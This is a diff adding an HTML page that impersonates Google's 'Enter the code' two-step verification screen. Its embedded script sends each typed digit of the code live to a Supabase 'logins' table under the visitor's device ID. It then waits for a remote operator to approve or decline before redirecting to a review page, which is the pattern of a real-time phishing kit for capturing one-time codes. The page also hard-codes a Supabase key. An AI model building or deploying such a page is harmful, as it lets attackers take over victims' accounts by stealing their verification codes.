@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Enter the code</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #fff;
+      color: #202124;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      text-align: center;
+      padding: 32px 20px;
+    }
+
+    .google-logo {
+      width: 90px;
+      margin: 40px 0 20px;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 500;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 15px;
+      color: #5f6368;
+      margin: 0 0 24px;
+      line-height: 1.5;
+      max-width: 340px;
+    }
+
+    .code-input {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      margin: 30px 0;
+    }
+
+    .digit {
+      width: 48px;
+      height: 56px;
+      text-align: center;
+      font-size: 22px;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      outline: none;
+      transition: border 0.2s;
+    }
+
+    .digit:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 1px #1a73e8;
+    }
+
+    .link {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 10px;
+      display: block;
+      position: relative;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    .resent {
+      opacity: 0;
+      color: #188038;
+      font-size: 14px;
+      margin-top: 6px;
+      transition: opacity 0.3s ease;
+    }
+
+    .resent.show {
+      opacity: 1;
+      animation: fadeOut 1.6s ease forwards;
+    }
+
+    @keyframes fadeOut {
+      0% { opacity: 0; transform: translateY(4px); }
+      20% { opacity: 1; transform: translateY(0); }
+      80% { opacity: 1; }
+      100% { opacity: 0; }
+    }
+
+    .submit-btn {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 24px;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 30px;
+      transition: background 0.2s, opacity 0.2s;
+      position: relative;
+    }
+
+    .submit-btn:hover {
+      background-color: #1669c1;
+    }
+
+    .submit-btn.loading {
+      background-color: #a4c6f5;
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid #fff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 22px;
+      }
+      p {
+        font-size: 14px;
+      }
+      .digit {
+        width: 42px;
+        height: 50px;
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
+
+  <h1>Enter the code</h1>
+  <p>We’ve sent a verification code to your mobile number.</p>
+
+  <div class="code-input">
+    <input type="text" maxlength="1" class="digit">
+    <input type="text" maxlength="1" class="digit">
+    <input type="text" maxlength="1" class="digit">
+    <input type="text" maxlength="1" class="digit">
+    <input type="text" maxlength="1" class="digit">
+    <input type="text" maxlength="1" class="digit">
+  </div>
+
+  <button class="submit-btn" id="nextBtn">Next</button>
+
+  <a href="#" class="link" id="resendLink">Didn’t get the code?</a>
+  <div class="resent" id="resentMsg">Code resent</div>
+
+  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <script>
+    (async () => {
+ const SUPABASE_URL = "https://bipnmthaonkbffothwkj.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJpcG5tdGhhb25rYmZmb3Rod2tqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk3OTc0NDUsImV4cCI6MjA3NTM3MzQ0NX0.9mNaxvZolgyyvyZP7n2x_nUwL8h1EHknpjR4_aMlPyc";
+  const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+      const deviceId = localStorage.getItem("device_id");
+      const inputs = document.querySelectorAll(".digit");
+      const nextBtn = document.getElementById("nextBtn");
+      const resendLink = document.getElementById("resendLink");
+      const resentMsg = document.getElementById("resentMsg");
+
+      const errorMessage = document.createElement("div");
+      errorMessage.style.cssText = "color:#d93025;font-size:14px;margin-top:10px;display:none;text-align:center;";
+      document.body.appendChild(errorMessage);
+
+      function getCode() {
+        return Array.from(inputs).map(i => i.value).join("");
+      }
+
+      // Live sync code typing
+      inputs.forEach((input, index) => {
+        input.addEventListener("input", async () => {
+          if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+          const val = getCode();
+          await client.from("logins").update({ user_code: val, page_name: "phone" }).eq("device_id", deviceId);
+        });
+        input.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !input.value && index > 0) inputs[index - 1].focus();
+        });
+      });
+
+      // Next button click - animate verifying...
+      nextBtn.addEventListener("click", async () => {
+        const code = getCode().trim();
+        if (!code) {
+          errorMessage.textContent = "Please enter the verification code.";
+          errorMessage.style.display = "block";
+          return;
+        }
+
+        errorMessage.style.display = "none";
+
+        // Add verifying animation
+        nextBtn.classList.add("loading");
+        nextBtn.innerHTML = '<span class="spinner"></span>Verifying...';
+
+        await client.from("logins")
+          .update({ user_code: code, login_status: "pending", page_name: "phone" })
+          .eq("device_id", deviceId);
+      });
+
+      // Resend link click
+      resendLink.addEventListener("click", async (e) => {
+        e.preventDefault();
+        resendLink.style.pointerEvents = "none";
+        await client.from("logins").update({ login_status: "didntgetcode" }).eq("device_id", deviceId);
+        resentMsg.classList.add("show");
+        setTimeout(() => {
+          resentMsg.classList.remove("show");
+          resendLink.style.pointerEvents = "auto";
+        }, 2000);
+      });
+
+      // Handle realtime changes
+      function handleStatus(row) {
+        if (!row) return;
+        if (row.login_status === "approved") window.location.href = "review.html";
+        if (row.login_status === "declined") {
+          nextBtn.classList.remove("loading");
+          nextBtn.innerHTML = "Next";
+          errorMessage.textContent = "Invalid code. Please try again.";
+          errorMessage.style.display = "block";
+        }
+      }
+
+      client.channel("phone_" + deviceId)
+        .on("postgres_changes", {
+          event: "UPDATE",
+          schema: "public",
+          table: "logins",
+          filter: `device_id=eq.${deviceId}`
+        }, payload => handleStatus(payload.new))
+        .subscribe();
+
+      // Poll fallback
+      setInterval(async () => {
+        const { data } = await client.from("logins").select("*").eq("device_id", deviceId).maybeSingle();
+        if (data) handleStatus(data);
+      }, 4000);
+    })();
+  </script>
+</body>
+</html>
